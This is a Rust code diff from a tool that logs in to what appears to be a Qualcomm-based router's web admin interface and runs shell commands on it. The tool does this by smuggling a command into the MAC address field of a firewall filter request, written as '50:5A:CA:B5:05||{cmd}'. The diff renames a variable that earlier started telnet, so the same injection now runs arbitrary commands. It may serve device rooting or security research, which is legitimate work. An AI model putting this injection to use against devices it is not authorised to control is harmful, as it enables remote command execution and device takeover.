@@ -71,14 +71,14 @@ async fn run_command(admin_ip: &str, admin_password: &str, cmd: &str) -> Result<
         None => bail!("login did not return a token in response: {}", login),
     };
 
-    let telnet = client.post(&qcmap_web_cgi_endpoint)
+    let command = client.post(&qcmap_web_cgi_endpoint)
         .body(format!("page=setFWMacFilter&cmd=add&mode=0&mac=50:5A:CA:B5:05||{cmd}&key=50:5A:CA:B5:05:AC&token={token}"))
         .send()
         .await?;
-    if telnet.status() != 200 {
+    if command.status() != 200 {
         bail!(
-            "starting telnet failed with status code: {:?}",
-            telnet.status()
+            "running command failed with status code: {:?}",
+            command.status()
         );
     }
 
